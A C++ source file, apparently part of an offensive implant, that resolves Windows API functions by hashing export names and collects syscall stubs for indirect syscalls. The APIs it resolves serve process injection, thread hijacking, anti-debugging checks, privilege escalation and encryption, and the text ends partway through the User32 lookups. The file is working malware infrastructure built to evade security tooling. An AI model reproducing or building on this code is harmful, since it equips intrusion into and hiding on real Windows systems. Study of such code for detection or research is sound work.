#include "core/procs.hpp"

namespace Procs
{
    DWORD StringToHashFunc(char* str)
    {
        int c;
        DWORD dwHash = HASH_IV;

        while (c = *str++)
        {
            dwHash = dwHash * RANDOM_ADDR + c;
        }

        return dwHash & 0xFFFFFFFF;
    }

    PVOID GetProcAddressByHash(
        HMODULE hModule,
        DWORD   dwHash
    ) {
        PVOID pFuncAddr = nullptr;

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hModule + pDosHeader->e_lfanew);

        DWORD_PTR dwpExportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

        PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)hModule + dwpExportDirRVA);

        PDWORD pdwAddrOfFuncsRVA = (PDWORD)((DWORD_PTR)hModule + pExportDir->AddressOfFunctions);
        PDWORD pdwAddrOfNamesRVA = (PDWORD)((DWORD_PTR)hModule + pExportDir->AddressOfNames);
        PWORD pdwAddrOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)hModule + pExportDir->AddressOfNameOrdinals);

        for (DWORD i = 0; i < pExportDir->NumberOfFunctions; i++)
        {
            DWORD dwFuncNameRVA = pdwAddrOfNamesRVA[i];
            DWORD_PTR dwpFuncNameRVA = (DWORD_PTR)hModule + dwFuncNameRVA;
            char* sFuncName = (char*)dwpFuncNameRVA;
            DWORD_PTR dwpFuncAddrRVA = 0;

            DWORD dwFuncNameHash = StringToHashFunc(sFuncName);
            if (dwFuncNameHash == dwHash)
            {
                dwpFuncAddrRVA = pdwAddrOfFuncsRVA[pdwAddrOfNameOrdinalsRVA[i]];
                pFuncAddr = (PVOID)((DWORD_PTR)hModule + dwpFuncAddrRVA);
                return pFuncAddr;
            }
        }

        return nullptr;
    }

    VOID FindProcs(
        Procs::PPROCS pProcs,
        HMODULE hNtdll,
        HMODULE hKernel32,
        BOOL bIndirectSyscall
    ) {
        // NTAPI (Ntdll)
        PVOID pLdrLoadDll                       = GetProcAddressByHash(hNtdll, HASH_FUNC_LDRLOADDLL);
        pProcs->lpLdrLoadDll                    = reinterpret_cast<LPPROC_LDRLOADDLL>(pLdrLoadDll);
        PVOID pNtAllocateVirtualMemory          = GetProcAddressByHash(hNtdll, HASH_FUNC_NTALLOCATEVIRTUALMEMORY);
        pProcs->lpNtAllocateVirtualMemory       = reinterpret_cast<LPPROC_NTALLOCATEVIRTUALMEMORY>(pNtAllocateVirtualMemory);
        PVOID pNtClose                          = GetProcAddressByHash(hNtdll, HASH_FUNC_NTCLOSE);
        pProcs->lpNtClose                       = reinterpret_cast<LPPROC_NTCLOSE>(pNtClose);
        PVOID pNtCreateFile                     = GetProcAddressByHash(hNtdll, HASH_FUNC_NTCREATEFILE);
        pProcs->lpNtCreateFile                  = reinterpret_cast<LPPROC_NTCREATEFILE>(pNtCreateFile);
        PVOID pNtCreateProcessEx                = GetProcAddressByHash(hNtdll, HASH_FUNC_NTCREATEPROCESSEX);
        pProcs->lpNtCreateProcessEx             = reinterpret_cast<LPPROC_NTCREATEPROCESSEX>(pNtCreateProcessEx);
        PVOID pNtCreateSection                  = GetProcAddressByHash(hNtdll, HASH_FUNC_NTCREATESECTION);
        pProcs->lpNtCreateSection               = reinterpret_cast<LPPROC_NTCREATESECTION>(pNtCreateSection);
        PVOID pNtCreateThreadEx                 = GetProcAddressByHash(hNtdll, HASH_FUNC_NTCREATETHREADEX);
        pProcs->lpNtCreateThreadEx              = reinterpret_cast<LPPROC_NTCREATETHREADEX>(pNtCreateThreadEx);
        PVOID pNtDuplicateObject                = GetProcAddressByHash(hNtdll, HASH_FUNC_NTDUPLICATEOBJECT);
        pProcs->lpNtDuplicateObject             = reinterpret_cast<LPPROC_NTDUPLICATEOBJECT>(pNtDuplicateObject);
        PVOID pNtFreeVirtualMemory              = GetProcAddressByHash(hNtdll, HASH_FUNC_NTFREEVIRTUALMEMORY);
        pProcs->lpNtFreeVirtualMemory           = reinterpret_cast<LPPROC_NTFREEVIRTUALMEMORY>(pNtFreeVirtualMemory);
        PVOID pNtGetContextThread               = GetProcAddressByHash(hNtdll, HASH_FUNC_NTGETCONTEXTTHREAD);
        pProcs->lpNtGetContextThread            = reinterpret_cast<LPPROC_NTGETCONTEXTTHREAD>(pNtGetContextThread);
        PVOID pNtMapViewOfSection               = GetProcAddressByHash(hNtdll, HASH_FUNC_NTMAPVIEWOFSECTION);
        pProcs->lpNtMapViewOfSection            = reinterpret_cast<LPPROC_NTMAPVIEWOFSECTION>(pNtMapViewOfSection);
        PVOID pNtOpenProcess                    = GetProcAddressByHash(hNtdll, HASH_FUNC_NTOPENPROCESS);
        pProcs->lpNtOpenProcess                 = reinterpret_cast<LPPROC_NTOPENPROCESS>(pNtOpenProcess);
        PVOID pNtOpenProcessToken               = GetProcAddressByHash(hNtdll, HASH_FUNC_NTOPENPROCESSTOKEN);
        pProcs->lpNtOpenProcessToken            = reinterpret_cast<LPPROC_NTOPENPROCESSTOKEN>(pNtOpenProcessToken);
        PVOID pNtOpenThread                     = GetProcAddressByHash(hNtdll, HASH_FUNC_NTOPENTHREAD);
        pProcs->lpNtOpenThread                  = reinterpret_cast<LPPROC_NTOPENTHREAD>(pNtOpenThread);
        PVOID pNtProtectVirtualMemory           = GetProcAddressByHash(hNtdll, HASH_FUNC_NTPROTECTVIRTUALMEMORY);
        pProcs->lpNtProtectVirtualMemory        = reinterpret_cast<LPPROC_NTPROTECTVIRTUALMEMORY>(pNtProtectVirtualMemory);
        PVOID pNtQueryInformationFile           = GetProcAddressByHash(hNtdll, HASH_FUNC_NTQUERYINFORMATIONFILE);
        pProcs->lpNtQueryInformationFile        = reinterpret_cast<LPPROC_NTQUERYINFORMATIONFILE>(pNtQueryInformationFile);
        PVOID pNtQueryInformationProcess        = GetProcAddressByHash(hNtdll, HASH_FUNC_NTQUERYINFORMATIONPROCESS);
        pProcs->lpNtQueryInformationProcess     = reinterpret_cast<LPPROC_NTQUERYINFORMATIONPROCESS>(pNtQueryInformationProcess);
        PVOID pNtQueryVirtualMemory             = GetProcAddressByHash(hNtdll, HASH_FUNC_NTQUERYVIRTUALMEMORY);
        pProcs->lpNtQueryVirtualMemory          = reinterpret_cast<LPPROC_NTQUERYVIRTUALMEMORY>(pNtQueryVirtualMemory);
        PVOID pNtReadFile                       = GetProcAddressByHash(hNtdll, HASH_FUNC_NTREADFILE);
        pProcs->lpNtReadFile                    = reinterpret_cast<LPPROC_NTREADFILE>(pNtReadFile);
        PVOID pNtReadVirtualMemory              = GetProcAddressByHash(hNtdll, HASH_FUNC_NTREADVIRTUALMEMORY);
        pProcs->lpNtReadVirtualMemory           = reinterpret_cast<LPPROC_NTREADVIRTUALMEMORY>(pNtReadVirtualMemory);
        PVOID pNtResumeThread                   = GetProcAddressByHash(hNtdll, HASH_FUNC_NTRESUMETHREAD);
        pProcs->lpNtResumeThread                = reinterpret_cast<LPPROC_NTRESUMETHREAD>(pNtResumeThread);
        PVOID pNtSetContextThread               = GetProcAddressByHash(hNtdll, HASH_FUNC_NTSETCONTEXTTHREAD);
        pProcs->lpNtSetContextThread            = reinterpret_cast<LPPROC_NTSETCONTEXTTHREAD>(pNtSetContextThread);
        PVOID pNtSetInformationProcess          = GetProcAddressByHash(hNtdll, HASH_FUNC_NTSETINFORMATIONPROCESS);
        pProcs->lpNtSetInformationProcess       = reinterpret_cast<LPPROC_NTSETINFORMATIONPROCESS>(pNtSetInformationProcess);
        PVOID pNtTerminateProcess               = GetProcAddressByHash(hNtdll, HASH_FUNC_NTTERMINATEPROCESS);
        pProcs->lpNtTerminateProcess            = reinterpret_cast<LPPROC_NTTERMINATEPROCESS>(pNtTerminateProcess);
        PVOID pNtUnmapViewOfSection             = GetProcAddressByHash(hNtdll, HASH_FUNC_NTUNMAPVIEWOFSECTION);
        pProcs->lpNtUnmapViewOfSection          = reinterpret_cast<LPPROC_NTUNMAPVIEWOFSECTION>(pNtUnmapViewOfSection);
        PVOID pNtWaitForSingleObject            = GetProcAddressByHash(hNtdll, HASH_FUNC_NTWAITFORSINGLEOBJECT);
        pProcs->lpNtWaitForSingleObject         = reinterpret_cast<LPPROC_NTWAITFORSINGLEOBJECT>(pNtWaitForSingleObject);
        PVOID pNtWriteFile                      = GetProcAddressByHash(hNtdll, HASH_FUNC_NTWRITEFILE);
        pProcs->lpNtWriteFile                   = reinterpret_cast<LPPROC_NTWRITEFILE>(pNtWriteFile);
        PVOID pNtWriteVirtualMemory             = GetProcAddressByHash(hNtdll, HASH_FUNC_NTWRITEVIRTUALMEMORY);
        pProcs->lpNtWriteVirtualMemory          = reinterpret_cast<LPPROC_NTWRITEVIRTUALMEMORY>(pNtWriteVirtualMemory);
        PVOID pRtlAllocateHeap                  = GetProcAddressByHash(hNtdll, HASH_FUNC_RTLALLOCATEHEAP);
        pProcs->lpRtlAllocateHeap               = reinterpret_cast<LPPROC_RTLALLOCATEHEAP>(pRtlAllocateHeap);
        PVOID pRtlCreateProcessReflection       = GetProcAddressByHash(hNtdll, HASH_FUNC_RTLCREATEPROCESSREFLECTION);
        pProcs->lpRtlCreateProcessReflection    = reinterpret_cast<LPPROC_RTLCREATEPROCESSREFLECTION>(pRtlCreateProcessReflection);
        PVOID pRtlCreateUserThread              = GetProcAddressByHash(hNtdll, HASH_FUNC_RTLCREATEUSERTHREAD);
        pProcs->lpRtlCreateUserThread           = reinterpret_cast<LPPROC_RTLCREATEUSERTHREAD>(pRtlCreateUserThread);
        PVOID pRtlGetFullPathName_U             = GetProcAddressByHash(hNtdll, HASH_FUNC_RTLGETFULLPATHNAME_U);
        pProcs->lpRtlGetFullPathName_U          = reinterpret_cast<LPPROC_RTLGETFULLPATHNAME_U>(pRtlGetFullPathName_U);
        PVOID pRtlInitUnicodeString             = GetProcAddressByHash(hNtdll, HASH_FUNC_RTLINITUNICODESTRING);
        pProcs->lpRtlInitUnicodeString          = reinterpret_cast<LPPROC_RTLINITUNICODESTRING>(pRtlInitUnicodeString);
        PVOID pRtlStringCchCatW                 = GetProcAddressByHash(hNtdll, HASH_FUNC_RTLSTRINGCCHCATW);
        pProcs->lpRtlStringCchCatW              = reinterpret_cast<LPPROC_RTLSTRINGCCHCATW>(pRtlStringCchCatW);
        PVOID pRtlStringCchCopyW                = GetProcAddressByHash(hNtdll, HASH_FUNC_RTLSTRINGCCHCOPYW);
        pProcs->lpRtlStringCchCopyW             = reinterpret_cast<LPPROC_RTLSTRINGCCHCOPYW>(pRtlStringCchCopyW);
        PVOID pRtlStringCchLengthW              = GetProcAddressByHash(hNtdll, HASH_FUNC_RTLSTRINGCCHLENGTHW);
        pProcs->lpRtlStringCchLengthW           = reinterpret_cast<LPPROC_RTLSTRINGCCHLENGTHW>(pRtlStringCchLengthW);
        PVOID pRtlZeroMemory                    = GetProcAddressByHash(hNtdll, HASH_FUNC_RTLZEROMEMORY);
        pProcs->lpRtlZeroMemory                 = reinterpret_cast<LPPROC_RTLZEROMEMORY>(pRtlZeroMemory);

        // WINAPI (Kernel32)
        PVOID pCheckRemoteDebuggerPresent       = GetProcAddressByHash(hKernel32, HASH_FUNC_CHECKREMOTEDEBUGGERPRESENT);
        pProcs->lpCheckRemoteDebuggerPresent    = reinterpret_cast<LPPROC_CHECKREMOTEDEBUGGERPRESENT>(pCheckRemoteDebuggerPresent);
        PVOID pCloseHandle                      = GetProcAddressByHash(hKernel32, HASH_FUNC_CLOSEHANDLE);
        pProcs->lpCloseHandle                   = reinterpret_cast<LPPROC_CLOSEHANDLE>(pCloseHandle);
        PVOID pConvertThreadToFiber             = GetProcAddressByHash(hKernel32, HASH_FUNC_CONVERTTHREADTOFIBER);
        pProcs->lpConvertThreadToFiber          = reinterpret_cast<LPPROC_CONVERTTHREADTOFIBER>(pConvertThreadToFiber);
        PVOID pCreateEventW                     = GetProcAddressByHash(hKernel32, HASH_FUNC_CREATEEVENTW);
        pProcs->lpCreateEventW                  = reinterpret_cast<LPPROC_CREATEEVENTW>(pCreateEventW);
        PVOID pCreateFiber                      = GetProcAddressByHash(hKernel32, HASH_FUNC_CREATEFIBER);
        pProcs->lpCreateFiber                   = reinterpret_cast<LPPROC_CREATEFIBER>(pCreateFiber);
        PVOID pCreatePipe                       = GetProcAddressByHash(hKernel32, HASH_FUNC_CREATEPIPE);
        pProcs->lpCreatePipe                    = reinterpret_cast<LPPROC_CREATEPIPE>(pCreatePipe);
        PVOID pCreateProcessW                   = GetProcAddressByHash(hKernel32, HASH_FUNC_CREATEPROCESSW);
        pProcs->lpCreateProcessW                = reinterpret_cast<LPPROC_CREATEPROCESSW>(pCreateProcessW);
        PVOID pCreateRemoteThreadEx             = GetProcAddressByHash(hKernel32, HASH_FUNC_CREATEREMOTETHREADEX);
        pProcs->lpCreateRemoteThreadEx          = reinterpret_cast<LPPROC_CREATEREMOTETHREADEX>(pCreateRemoteThreadEx);
        PVOID pCreateThreadpoolWait             = GetProcAddressByHash(hKernel32, HASH_FUNC_CREATETHREADPOOLWAIT);
        pProcs->lpCreateThreadpoolWait          = reinterpret_cast<LPPROC_CREATETHREADPOOLWAIT>(pCreateThreadpoolWait);
        PVOID pCreateToolhelp32Snapshot         = GetProcAddressByHash(hKernel32, HASH_FUNC_CREATETOOLHELP32SNAPSHOT);
        pProcs->lpCreateToolhelp32Snapshot      = reinterpret_cast<LPPROC_CREATETOOLHELP32SNAPSHOT>(pCreateToolhelp32Snapshot);
        PVOID pEnumProcessModules               = GetProcAddressByHash(hKernel32, HASH_FUNC_ENUMPROCESSMODULES);
        pProcs->lpEnumProcessModules            = reinterpret_cast<LPPROC_ENUMPROCESSMODULES>(pEnumProcessModules);
        PVOID pExpandEnvironmentStringsW        = GetProcAddressByHash(hKernel32, HASH_FUNC_EXPANDENVIRONMENTSTRINGSW);
        pProcs->lpExpandEnvironmentStringsW     = reinterpret_cast<LPPROC_EXPANDENVIRONMENTSTRINGSW>(pExpandEnvironmentStringsW);
        PVOID pFreeLibrary                      = GetProcAddressByHash(hKernel32, HASH_FUNC_FREELIBRARY);
        pProcs->lpFreeLibrary                   = reinterpret_cast<LPPROC_FREELIBRARY>(pFreeLibrary);
        PVOID pGetModuleBaseNameA               = GetProcAddressByHash(hKernel32, HASH_FUNC_GETMODULEBASENAMEA);
        pProcs->lpGetModuleBaseNameA            = reinterpret_cast<LPPROC_GETMODULEBASENAMEA>(pGetModuleBaseNameA);
        PVOID pGetModuleHandleA                 = GetProcAddressByHash(hKernel32, HASH_FUNC_GETMODULEHANDLEA);
        pProcs->lpGetModuleHandleA              = reinterpret_cast<LPPROC_GETMODULEHANDLEA>(pGetModuleHandleA);
        PVOID pGetProcAddress                   = GetProcAddressByHash(hKernel32, HASH_FUNC_GETPROCADDRESS);
        pProcs->lpGetProcAddress                = reinterpret_cast<LPPROC_GETPROCADDRESS>(pGetProcAddress);
        PVOID pGetSystemDirectoryW              = GetProcAddressByHash(hKernel32, HASH_FUNC_GETSYSTEMDIRECTORYW);
        pProcs->lpGetSystemDirectoryW           = reinterpret_cast<LPPROC_GETSYSTEMDIRECTORYW>(pGetSystemDirectoryW);
        PVOID pGetSystemInfo                    = GetProcAddressByHash(hKernel32, HASH_FUNC_GETSYSTEMINFO);
        pProcs->lpGetSystemInfo                 = reinterpret_cast<LPPROC_GETSYSTEMINFO>(pGetSystemInfo);
        PVOID pGetThreadContext                 = GetProcAddressByHash(hKernel32, HASH_FUNC_GETTHREADCONTEXT);
        pProcs->lpGetThreadContext              = reinterpret_cast<LPPROC_GETTHREADCONTEXT>(pGetThreadContext);
        PVOID pIsDebuggerPresent                = GetProcAddressByHash(hKernel32, HASH_FUNC_ISDEBUGGERPRESENT);
        pProcs->lpIsDebuggerPresent             = reinterpret_cast<LPPROC_ISDEBUGGERPRESENT>(pIsDebuggerPresent);
        PVOID pLoadLibraryA                     = GetProcAddressByHash(hKernel32, HASH_FUNC_LOADLIBRARYA);
        pProcs->lpLoadLibraryA                  = reinterpret_cast<LPPROC_LOADLIBRARYA>(pLoadLibraryA);
        PVOID pLoadLibraryW                     = GetProcAddressByHash(hKernel32, HASH_FUNC_LOADLIBRARYW);
        pProcs->lpLoadLibraryW                  = reinterpret_cast<LPPROC_LOADLIBRARYW>(pLoadLibraryW);
        PVOID pMessageBoxA                      = GetProcAddressByHash(hKernel32, HASH_FUNC_MESSAGEBOXA);
        pProcs->lpMessageBoxA                   = reinterpret_cast<LPPROC_MESSAGEBOXA>(pMessageBoxA);
        PVOID pMessageBoxW                      = GetProcAddressByHash(hKernel32, HASH_FUNC_MESSAGEBOXW);
        pProcs->lpMessageBoxW                   = reinterpret_cast<LPPROC_MESSAGEBOXW>(pMessageBoxW);
        PVOID pOpenProcess                      = GetProcAddressByHash(hKernel32, HASH_FUNC_OPENPROCESS);
        pProcs->lpOpenProcess                   = reinterpret_cast<LPPROC_OPENPROCESS>(pOpenProcess);
        PVOID pOpenThread                       = GetProcAddressByHash(hKernel32, HASH_FUNC_OPENTHREAD);
        pProcs->lpOpenThread                    = reinterpret_cast<LPPROC_OPENTHREAD>(pOpenThread);
        PVOID pProcess32FirstW                  = GetProcAddressByHash(hKernel32, HASH_FUNC_PROCESS32FIRSTW);
        pProcs->lpProcess32FirstW               = reinterpret_cast<LPPROC_PROCESS32FIRSTW>(pProcess32FirstW);
        PVOID pProcess32NextW                   = GetProcAddressByHash(hKernel32, HASH_FUNC_PROCESS32NEXTW);
        pProcs->lpProcess32NextW                = reinterpret_cast<LPPROC_PROCESS32NEXTW>(pProcess32NextW);
        PVOID pQueueUserAPC                     = GetProcAddressByHash(hKernel32, HASH_FUNC_QUEUEUSERAPC);
        pProcs->lpQueueUserAPC                  = reinterpret_cast<LPPROC_QUEUEUSERAPC>(pQueueUserAPC);
        PVOID pReadFile                         = GetProcAddressByHash(hKernel32, HASH_FUNC_READFILE);
        pProcs->lpReadFile                      = reinterpret_cast<LPPROC_READFILE>(pReadFile);
        PVOID pReadProcessMemory                = GetProcAddressByHash(hKernel32, HASH_FUNC_READPROCESSMEMORY);
        pProcs->lpReadProcessMemory             = reinterpret_cast<LPPROC_READPROCESSMEMORY>(pReadProcessMemory);
        PVOID pResumeThread                     = GetProcAddressByHash(hKernel32, HASH_FUNC_RESUMETHREAD);
        pProcs->lpResumeThread                  = reinterpret_cast<LPPROC_RESUMETHREAD>(pResumeThread);
        PVOID pSetHandleInformation             = GetProcAddressByHash(hKernel32, HASH_FUNC_SETHANDLEINFORMATION);
        pProcs->lpSetHandleInformation          = reinterpret_cast<LPPROC_SETHANDLEINFORMATION>(pSetHandleInformation);
        PVOID pSetThreadContext                 = GetProcAddressByHash(hKernel32, HASH_FUNC_SETTHREADCONTEXT);
        pProcs->lpSetThreadContext              = reinterpret_cast<LPPROC_SETTHREADCONTEXT>(pSetThreadContext);
        PVOID pSetThreadpoolWait                = GetProcAddressByHash(hKernel32, HASH_FUNC_SETTHREADPOOLWAIT);
        pProcs->lpSetThreadpoolWait             = reinterpret_cast<LPPROC_SETTHREADPOOLWAIT>(pSetThreadpoolWait);
        PVOID pSuspendThread                    = GetProcAddressByHash(hKernel32, HASH_FUNC_SUSPENDTHREAD);
        pProcs->lpSuspendThread                 = reinterpret_cast<LPPROC_SUSPENDTHREAD>(pSuspendThread);
        PVOID pSwitchToFiber                    = GetProcAddressByHash(hKernel32, HASH_FUNC_SWITCHTOFIBER);
        pProcs->lpSwitchToFiber                 = reinterpret_cast<LPPROC_SWITCHTOFIBER>(pSwitchToFiber);
        PVOID pTerminateProcess                 = GetProcAddressByHash(hKernel32, HASH_FUNC_TERMINATEPROCESS);
        pProcs->lpTerminateProcess              = reinterpret_cast<LPPROC_TERMINATEPROCESS>(pTerminateProcess);
        PVOID pThread32First                    = GetProcAddressByHash(hKernel32, HASH_FUNC_THREAD32FIRST);
        pProcs->lpThread32First                 = reinterpret_cast<LPPROC_THREAD32FIRST>(pThread32First);
        PVOID pThread32Next                     = GetProcAddressByHash(hKernel32, HASH_FUNC_THREAD32NEXT);
        pProcs->lpThread32Next                  = reinterpret_cast<LPPROC_THREAD32NEXT>(pThread32Next);
        PVOID pVirtualAlloc                     = GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALALLOC);
        pProcs->lpVirtualAlloc                  = reinterpret_cast<LPPROC_VIRTUALALLOC>(pVirtualAlloc);
        PVOID pVirtualAllocEx                   = GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALALLOCEX);
        pProcs->lpVirtualAllocEx                = reinterpret_cast<LPPROC_VIRTUALALLOCEX>(pVirtualAllocEx);
        PVOID pVirtualFree                      = GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALFREE);
        pProcs->lpVirtualFree                   = reinterpret_cast<LPPROC_VIRTUALFREE>(pVirtualFree);
        PVOID pVirtualProtect                   = GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALPROTECT);
        pProcs->lpVirtualProtect                = reinterpret_cast<LPPROC_VIRTUALPROTECT>(pVirtualProtect);
        PVOID pVirtualProtectEx                 = GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALPROTECTEX);
        pProcs->lpVirtualProtectEx              = reinterpret_cast<LPPROC_VIRTUALPROTECTEX>(pVirtualProtectEx);
        PVOID pVirtualQueryEx                   = GetProcAddressByHash(hKernel32, HASH_FUNC_VIRTUALQUERYEX);
        pProcs->lpVirtualQueryEx                = reinterpret_cast<LPPROC_VIRTUALQUERYEX>(pVirtualQueryEx);
        PVOID pWriteProcessMemory               = GetProcAddressByHash(hKernel32, HASH_FUNC_WRITEPROCESSMEMORY);
        pProcs->lpWriteProcessMemory            = reinterpret_cast<LPPROC_WRITEPROCESSMEMORY>(pWriteProcessMemory);

        if (bIndirectSyscall)
        {
            pProcs->sysLdrLoadDll                   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pLdrLoadDll));
            pProcs->sysNtAllocateVirtualMemory      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtAllocateVirtualMemory));
            pProcs->sysNtClose                      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtClose));
            pProcs->sysNtCreateFile                 = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateFile));
            pProcs->sysNtCreateProcessEx            = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateProcessEx));
            pProcs->sysNtCreateSection              = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateSection));
            pProcs->sysNtCreateThreadEx             = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateThreadEx));
            pProcs->sysNtFreeVirtualMemory          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtFreeVirtualMemory));
            pProcs->sysNtGetContextThread           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtGetContextThread));
            pProcs->sysNtMapViewOfSection           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtMapViewOfSection));
            pProcs->sysNtOpenProcess                = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenProcess));
            pProcs->sysNtOpenProcessToken           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenProcessToken));
            pProcs->sysNtOpenThread                 = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenThread));
            pProcs->sysNtProtectVirtualMemory       = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtProtectVirtualMemory));
            pProcs->sysNtQueryInformationFile       = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryInformationFile));
            pProcs->sysNtQueryInformationProcess    = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryInformationProcess));
            pProcs->sysNtQueryVirtualMemory         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryVirtualMemory));
            pProcs->sysNtReadFile                   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtReadFile));
            pProcs->sysNtReadVirtualMemory          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtReadVirtualMemory));
            pProcs->sysNtResumeThread               = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtResumeThread));
            pProcs->sysNtSetContextThread           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtSetContextThread));
            pProcs->sysNtSetInformationProcess      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtSetInformationProcess));
            pProcs->sysNtTerminateProcess           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtTerminateProcess));
            pProcs->sysNtUnmapViewOfSection         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtUnmapViewOfSection));
            pProcs->sysNtWaitForSingleObject        = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWaitForSingleObject));
            pProcs->sysNtWriteVirtualMemory         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWriteVirtualMemory));
            pProcs->sysNtWriteFile                  = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWriteFile));
            pProcs->sysRtlCreateProcessReflection   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlCreateProcessReflection));
            pProcs->sysRtlCreateUserThread          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlCreateUserThread));
            pProcs->sysRtlInitUnicodeString         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlInitUnicodeString));
            pProcs->sysRtlGetFullPathName_U         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlGetFullPathName_U));
        }
    }

    VOID FindProcsMisc(
        Procs::PPROCS   pProcs,
        HMODULE hAdvapi32,
        HMODULE hBcrypt,
        HMODULE hCrypt32,
        HMODULE hUser32,
        HMODULE hWinHttp,
        HMODULE hWs2_32
    ) {
        // Advapi32
        PVOID pAdjustTokenPrivileges            = GetProcAddressByHash(hAdvapi32, HASH_FUNC_ADJUSTTOKENPRIVILEGES);
        pProcs->lpAdjustTokenPrivileges         = reinterpret_cast<LPPROC_ADJUSTTOKENPRIVILEGES>(pAdjustTokenPrivileges);
        PVOID pLookupPrivilegeValueW            = GetProcAddressByHash(hAdvapi32, HASH_FUNC_LOOKUPPRIVILEGEVALUEW);
        pProcs->lpLookupPrivilegeValueW         = reinterpret_cast<LPPROC_LOOKUPPRIVILEGEVALUEW>(pLookupPrivilegeValueW);
        PVOID pOpenProcessToken                 = GetProcAddressByHash(hAdvapi32, HASH_FUNC_OPENPROCESSTOKEN);
        pProcs->lpOpenProcessToken              = reinterpret_cast<LPPROC_OPENPROCESSTOKEN>(pOpenProcessToken);

        // Bcrypt
        PVOID pBCryptCloseAlgorithmProvider     = GetProcAddressByHash(hBcrypt, HASH_FUNC_BCRYPTCLOSEALGORITHMPROVIDER);
        pProcs->lpBCryptCloseAlgorithmProvider  = reinterpret_cast<LPPROC_BCRYPTCLOSEALGORITHMPROVIDER>(pBCryptCloseAlgorithmProvider);
        PVOID pBCryptDecrypt                    = GetProcAddressByHash(hBcrypt, HASH_FUNC_BCRYPTDECRYPT);
        pProcs->lpBCryptDecrypt                 = reinterpret_cast<LPPROC_BCRYPTDECRYPT>(pBCryptDecrypt);
        PVOID pBCryptDestroyKey                 = GetProcAddressByHash(hBcrypt, HASH_FUNC_BCRYPTDESTROYKEY);
        pProcs->lpBCryptDestroyKey              = reinterpret_cast<LPPROC_BCRYPTDESTROYKEY>(pBCryptDestroyKey);
        PVOID pBCryptEncrypt                    = GetProcAddressByHash(hBcrypt, HASH_FUNC_BCRYPTENCRYPT);
        pProcs->lpBCryptEncrypt                 = reinterpret_cast<LPPROC_BCRYPTENCRYPT>(pBCryptEncrypt);
        PVOID pBCryptGenerateSymmetricKey       = GetProcAddressByHash(hBcrypt, HASH_FUNC_BCRYPTGENERATESYMMETRICKEY);
        pProcs->lpBCryptGenerateSymmetricKey    = reinterpret_cast<LPPROC_BCRYPTGENERATESYMMETRICKEY>(pBCryptGenerateSymmetricKey);
        PVOID pBCryptGetProperty                = GetProcAddressByHash(hBcrypt, HASH_FUNC_BCRYPTGETPROPERTY);
        pProcs->lpBCryptGetProperty             = reinterpret_cast<LPPROC_BCRYPTGETPROPERTY>(pBCryptGetProperty);
        PVOID pBCryptOpenAlgorithmProvider      = GetProcAddressByHash(hBcrypt, HASH_FUNC_BCRYPTOPENALGORITHMPROVIDER);
        pProcs->lpBCryptOpenAlgorithmProvider   = reinterpret_cast<LPPROC_BCRYPTOPENALGORITHMPROVIDER>(pBCryptOpenAlgorithmProvider);
        PVOID pBCryptSetProperty                = GetProcAddressByHash(hBcrypt, HASH_FUNC_BCRYPTSETPROPERTY);
        pProcs->lpBCryptSetProperty             = reinterpret_cast<LPPROC_BCRYPTSETPROPERTY>(pBCryptSetProperty);

        // Crypt32
        PVOID pCryptBinaryToStringW             = GetProcAddressByHash(hCrypt32, HASH_FUNC_CRYPTBINARYTOSTRINGW);
        pProcs->lpCryptBinaryToStringW          = reinterpret_cast<LPPROC_CRYPTBINARYTOSTRINGW>(pCryptBinaryToStringW);
        PVOID pCryptStringToBinaryW             = GetProcAddressByHash(hCrypt32, HASH_FUNC_CRYPTSTRINGTOBINARYW);
        pProcs->lpCryptStringToBinaryW          = reinterpret_cast<LPPROC_CRYPTSTRINGTOBINARYW>(pCryptStringToBinaryW);

        // User32
        PVOID pFindWindowW                      = GetProcAddressByHash(hUser32, HASH_FUNC_FINDWINDOWW);
